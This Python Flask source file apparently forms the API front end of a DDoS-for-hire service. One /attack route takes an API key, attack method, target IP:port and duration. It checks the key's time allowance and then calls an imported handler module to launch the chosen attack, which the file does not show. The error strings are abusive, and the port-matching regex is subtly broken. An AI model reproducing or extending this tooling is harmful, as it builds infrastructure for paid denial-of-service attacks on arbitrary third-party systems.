import handler
import json
import re

from flask import Flask
app = Flask(__name__)

@app.route("/attack/<api_key>/<method>/<target>/<length>")
def attack(api_key, method, target, length):
	
	access_keys = json.loads(open('keys.json', 'r').read())

	if api_key in access_keys['keys'][0]:
		pass
	else:
		return json.dumps({'success': False, 'message': 'Sorry, your key is invalid! Fuck off hacker scum.'})
	
	if re.match(r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}:[0-65535]{1,5}$', target):
		pass
	else:
		return json.dumps({'success': False, 'message': 'Not a valid target. Please reconsider your life. :)'})

	if int(length) <= int(access_keys['keys'][0][api_key]):
		pass
	else:
		return json.dumps({'success': False, 'message': 'Length is either invalid or exceeds time permitted.'})

	try:
		attack = handler.attacks[method]()
	except:
		return json.dumps({'success': False, 'message': 'Attack method does not exist, the fuck you think this is?'})

	try:
		return attack.attack(target, method, length)
	except:
		return json.dumps({'success': False, 'message': 'Attack failed early, unsure why.'})

if __name__ == "__main__":
    app.run()